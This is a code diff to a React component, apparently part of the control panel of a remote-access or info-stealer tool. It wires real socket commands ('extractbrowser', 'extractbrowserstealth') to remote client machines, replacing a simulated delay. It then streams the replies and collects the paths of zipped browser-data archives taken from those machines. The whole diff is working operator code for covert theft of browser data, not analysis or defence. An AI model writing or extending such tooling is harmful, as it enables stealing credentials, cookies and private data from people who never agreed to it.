@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import styled from 'styled-components';
 import { 
   FiShield, 
@@ -226,23 +226,61 @@ const ResultActions = styled.div`
 const BrowserExtractor = ({ client, socket }) => {
   const [extracting, setExtracting] = useState(false);
   const [results, setResults] = useState([]);
+  const [extractionOutput, setExtractionOutput] = useState('');
+
+  // Listen for command responses
+  useEffect(() => {
+    if (!socket || !client) return;
+
+    const handleCommandResponse = (data) => {
+      if (data.clientId === client.id) {
+        setExtractionOutput(prev => prev + data.response + '\n');
+        
+        // Check if extraction is complete
+        if (data.response.includes('Browser data extracted successfully') || 
+            data.response.includes('Stealth browser data extraction completed')) {
+          setExtracting(false);
+          toast.success('Browser data extraction completed!');
+          
+          // Parse the response to extract file paths
+          const lines = data.response.split('\n');
+          const newResults = [];
+          
+          for (const line of lines) {
+            if (line.includes('ZIP FILE LOCATION:') || line.includes('ZIP FILE LOCATIONS:')) {
+              const pathMatch = line.match(/LOCATION[^:]*:\s*(.+)/);
+              if (pathMatch) {
+                newResults.push({
+                  name: 'Browser Data Archive',
+                  path: pathMatch[1].trim(),
+                  type: 'zip'
+                });
+              }
+            }
+          }
+          
+          if (newResults.length > 0) {
+            setResults(prev => [...prev, ...newResults]);
+          }
+        }
+      }
+    };
+
+    socket.on('commandResponse', handleCommandResponse);
+    return () => socket.off('commandResponse', handleCommandResponse);
+  }, [socket, client]);
 
   const handleExtract = (type) => {
     if (!client || !socket) return;
 
     setExtracting(true);
+    setExtractionOutput('');
     const command = type === 'stealth' ? 'extractbrowserstealth' : 'extractbrowser';
     
     socket.emit('executeCommand', {
       clientId: client.id,
       command: command
     });
-
-    // Simulate extraction process
-    setTimeout(() => {
-      setExtracting(false);
-      toast.success(`Browser data extraction ${type} completed!`);
-    }, 3000);
   };
 
   const handleViewPaths = () => {
@@ -347,9 +385,31 @@ const BrowserExtractor = ({ client, socket }) => {
           </OptionCard>
         </ExtractionOptions>
 
+        {extractionOutput && (
+          <InfoCard>
+            <InfoTitle>
+              <FiClock />
+              Extraction Progress
+            </InfoTitle>
+            <div style={{ 
+              background: '#000', 
+              padding: '12px', 
+              borderRadius: '6px', 
+              fontFamily: 'monospace', 
+              fontSize: '12px',
+              color: '#00ff88',
+              maxHeight: '200px',
+              overflowY: 'auto',
+              whiteSpace: 'pre-wrap'
+            }}>
+              {extractionOutput}
+            </div>
+          </InfoCard>
+        )}
+
         <ResultsSection>
           <ResultsTitle>
-            <FiCheckCircle />
+            <FiHardDrive />
             Extraction Results
           </ResultsTitle>
           {results.length === 0 ? (
